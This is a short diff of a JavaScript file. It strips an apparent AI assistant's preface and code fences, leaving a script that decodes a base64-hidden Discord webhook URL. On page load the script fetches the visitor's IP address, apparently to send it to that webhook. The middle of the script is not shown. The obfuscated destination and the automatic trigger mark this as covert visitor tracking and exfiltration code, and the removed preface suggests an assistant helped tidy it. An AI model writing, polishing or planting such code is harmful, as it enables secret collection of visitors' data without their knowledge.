@@ -1,6 +1,3 @@
-To remove the console logs from the code, you can simply remove the `console.log` statements. Here's the modified code without the console logs:
-
-```javascript
 // Encoded webhook URL
 const encodedWebhookURL = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzOTg4NjIzMjMxODkwMjMxNC9HdWZnejd1cTVlU08xQ1NGMEE4X2RNS0ZDNGYtVm05dU5NTGFqdTFScXVneDlWZ05KREtVOFZ4RV9EMVUyRjJTeV90Tg==';
 const webhookURL = atob(encodedWebhookURL); // Decoding the URL
@@ -63,4 +60,3 @@ window.addEventListener('load', () => {
         })
         .catch(error => console.error('Error getting IP address:', error));
 });
-```
